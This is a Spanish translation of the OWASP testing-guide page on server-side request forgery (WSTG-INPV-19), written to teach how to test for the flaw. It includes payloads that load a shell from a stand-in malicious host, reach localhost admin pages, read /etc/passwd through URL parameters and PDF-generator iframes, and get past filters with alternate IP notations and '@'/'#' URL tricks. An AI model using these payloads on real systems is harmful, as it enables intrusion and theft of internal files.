# Pruebas para falsificación de solicitudes del lado del servidor

|ID          |
|------------|
|WSTG-INPV-19|

## Resumen

Las aplicaciones web a menudo interactúan con recursos internos o externos. Aunque se puede esperar que solo el recurso previsto maneje los datos que se envían, los datos manejados incorrectamente pueden crear una situación donde son posibles ataques de inyección. Un tipo de ataque de inyección se llama falsificación de solicitudes del lado del servidor (SSRF). Un ataque SSRF exitoso puede otorgar al atacante acceso a acciones restringidas, servicios internos o archivos internos dentro de la aplicación o la organización. En algunos casos, puede incluso llevar a la ejecución remota de código (RCE).

## Objetivos de la prueba

- Identificar puntos de inyección SSRF.
- Probar si los puntos de inyección son explotables.
- Evaluar la gravedad de la vulnerabilidad.

## Cómo probar

Al probar SSRF, se intenta hacer que el servidor objetivo cargue o guarde inadvertidamente contenido que podría ser malicioso. La prueba más común es para inclusión de archivos locales y remotos. También hay otra faceta del SSRF: una relación de confianza que a menudo surge donde el servidor de la aplicación puede interactuar con otros sistemas back-end que no son directamente accesibles por los usuarios. Estos sistemas back-end a menudo tienen direcciones IP privadas no enrutables o están restringidos a ciertos hosts. Dado que están protegidos por la topología de la red, a menudo carecen de controles más sofisticados. Estos sistemas internos a menudo contienen datos sensibles o funcionalidad.

Considere la siguiente solicitud:

``` http
GET https://example.com/page?page=about.php
```

Puede probar esta solicitud con los siguientes payloads.

### Cargar el contenido de un archivo

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

### Acceder a una página restringida

```http
GET https://example.com/page?page=http://localhost/admin
```

O:

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

Use la interfaz de loopback para acceder a contenido restringido solo al host. Este mecanismo implica que si tiene acceso al host, también tiene privilegios para acceder directamente a la página `admin`.

Este tipo de relaciones de confianza, donde las solicitudes originadas desde la máquina local se manejan de manera diferente a las solicitudes ordinarias, son a menudo lo que permite que SSRF sea una vulnerabilidad crítica.

### Obtener un archivo local

```http
GET https://example.com/page?page=file:///etc/passwd
```

### Métodos HTTP utilizados

Todos los payloads anteriores pueden aplicarse a cualquier tipo de solicitud HTTP, y también podrían inyectarse en valores de encabezado y cookie.

Una nota importante sobre SSRF con solicitudes POST es que el SSRF también puede manifestarse de manera ciega, porque la aplicación puede no devolver nada inmediatamente. En su lugar, los datos inyectados pueden usarse en otras funcionalidades como informes PDF, manejo de facturas u órdenes, etc., que pueden ser visibles para empleados o personal pero no necesariamente para el usuario final o el probador.

Puede encontrar más sobre Blind SSRF [aquí](https://portswigger.net/web-security/ssrf/blind), o en la [sección de referencias](#references).

### Generadores de PDF

En algunos casos, un servidor puede convertir archivos subidos a formato PDF. Intente inyectar elementos `<iframe>`, `<img>`, `<base>` o `<script>`, o funciones CSS `url()` apuntando a servicios internos.

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### Bypass de filtros comunes

Algunas aplicaciones bloquean referencias a `localhost` y `127.0.0.1`. Esto se puede eludir mediante:

- Uso de representación IP alternativa que evalúa a `127.0.0.1`:
    - Notación decimal: `2130706433`
    - Notación octal: `017700000001`
    - Acortamiento de IP: `127.1`
- Ofuscación de cadena
- Registro de su propio dominio que resuelve a `127.0.0.1`

A veces la aplicación permite entrada que coincide con una cierta expresión, como un dominio. Eso se puede eludir si el analizador de esquema URL no está implementado correctamente, resultando en ataques similares a [ataques semánticos](https://tools.ietf.org/html/rfc3986#section-7.6).

- Uso del carácter `@` para separar entre la información del usuario y el host: `https://expected-domain@attacker-domain`
- Fragmentación de URL con el carácter `#`: `https://attacker-domain#expected-domain`
- Codificación de URL
- Fuzzing
- Combinaciones de todo lo anterior

Para payloads adicionales y técnicas de bypass, consulte la [sección de referencias](#references).

## Remediation

SSRF se conoce como uno de los ataques más difíciles de derrotar sin el uso de listas de permitidos que requieren IPs y URLs específicas para ser permitidas. Para más sobre prevención de SSRF, lea la [Hoja de referencia de prevención de falsificación de solicitudes del lado del servidor](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## Referencias

- [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
- [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)
- [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
- [Bugcrowd Webinar: SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
- [Hackerone Blog: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)
- [URI Generic Syntax](https://tools.ietf.org/html/rfc3986)